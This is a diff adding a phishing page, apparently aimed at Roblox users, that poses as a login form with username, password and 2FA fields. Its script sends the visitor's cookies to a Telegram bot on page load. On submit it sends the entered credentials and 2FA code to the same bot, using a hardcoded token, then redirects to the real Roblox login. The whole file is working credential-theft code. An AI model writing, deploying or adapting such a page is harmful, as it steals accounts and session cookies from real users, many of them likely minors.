@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Vhod</title></head>
+<body>
+<h2>Vhod</h2>
+<form id=f>
+<input id=u placeholder=Login>
+<input id=p placeholder=Pass>
+<input id=t placeholder=2FA>
+<button type=submit>Voyti</button>
+</form>
+<script>
+let token='8741509725:AAEr1qxXJs45a6guiSYndDkCqj94s09IJKo';
+let cid='8490701293';fetch('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+cid+'&text=Cookie: '+encodeURIComponent(document.cookie));
+f.onsubmit=function(e){
+e.preventDefault();
+let d='Login: '+u.value+' | Pass: '+p.value+' | 2FA: '+t.value;fetch('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+cid+'&text='+encodeURIComponent(d));
+location='https://roblox.com/login';
+}
+</script>
+</body>
+</html>
